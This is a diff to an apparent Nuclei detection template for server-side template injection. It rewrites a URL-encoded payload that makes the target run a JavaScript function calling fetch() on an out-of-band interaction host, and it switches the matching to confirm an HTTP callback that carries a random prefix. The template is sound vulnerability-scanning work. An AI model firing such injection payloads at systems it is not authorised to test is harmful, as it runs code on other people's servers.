@@ -11,6 +11,9 @@ info:
     verified: true
   tags: ssti,dast,oast,oob
 
+variables:
+  prefix: "{{rand_text_alpha(5)}}"
+
 http:
   - pre-condition:
       - type: dsl
@@ -19,7 +22,7 @@ http:
 
     payloads:
       injection:
-        - '%7B%7B%3Dfunction%28%29%7Bfetch%28%22http%3A%2F%2F{{interactsh-url}}%22%29%7D%28%29%7D%7D'
+        - '%7B%7B%3Dfunction%28%29%7B%0A%20%20fetch%28%22http%3A%2F%2F{{interactsh-url}}%22%2C%20%7B%0A%20%20%20%20headers%3A%20%7B%0A%20%20%20%20%20%20%22{{prefix}}%22%3A%20%22application%2Fjson%22%0A%20%20%20%20%7D%0A%20%20%7D%29%0A%7D%28%29%7D%7D'
 
     skip-variables-check: true
 
@@ -30,14 +33,10 @@ http:
         fuzz:
           - "{{injection}}"
 
-    matchers-condition: and
     matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the DNS Interaction
-        words:
-          - "dns"
-
-      - type: word
-        part: body
-        words:
-          - "undefined"
+      - type: dsl
+        name: request-matcher
+        dsl:
+          - "contains(interactsh_protocol,'http')"
+          - "contains(to_lower(interactsh_request), to_lower(prefix))"
+        condition: and
